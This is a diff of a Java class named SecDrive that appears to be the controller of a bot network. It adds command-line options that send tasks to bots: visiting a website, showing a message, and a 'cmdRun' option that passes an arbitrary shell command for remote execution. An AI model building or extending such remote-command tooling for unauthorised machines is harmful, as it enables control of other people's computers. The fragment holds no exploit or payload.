@@ -13,14 +13,49 @@ public class SecDrive {
                 runBot();
             }
             else if (param.equals("server_send")){
+                String type;
                 String wwwAddress;
-                if(args.length>1){
-                    wwwAddress = args[1];
+                String command;
+                String message;
+                if (args.length>1){
+                    type = args[1];
+                    if (type.equals("viewSite")){
+                        if(args.length>2){
+                            if(args[2].equals("default")){
+                                wwwAddress = "https://www.myip.com/";
+                            }
+                            else{
+                                wwwAddress = args[2];
+                            }
+                            Server.sendCommand(Task.TaskType.VIEW_SITE, wwwAddress);
+                        }
+                        else{
+                            System.out.println("Please pass website address...");
+                        }
+                    }
+                    else if (type.equals("cmdRun")){
+                        if(args.length>2){
+                            command = args[2];
+                            Server.sendCommand(Task.TaskType.CMD_RUN, command);
+                        }
+                        else {
+                            System.out.println("Please pass command to cmdRun...");
+                        }
+                    }
+                    else if (type.equals("say")){
+                        if(args.length>2){
+                            message = args[2];
+                            Server.sendCommand(Task.TaskType.HELLO, message);
+                        }
+                        else {
+                            System.out.println("Please pass message...");
+                        }
+
+                    }
                 }
-                else{
-                    wwwAddress = "https://www.myip.com/";
-                }
-                Server.sendCommand(Task.TaskType.VIEW_SITE, wwwAddress);
+                
+
+
 
             }
             else if(param.equals("server_responses")){
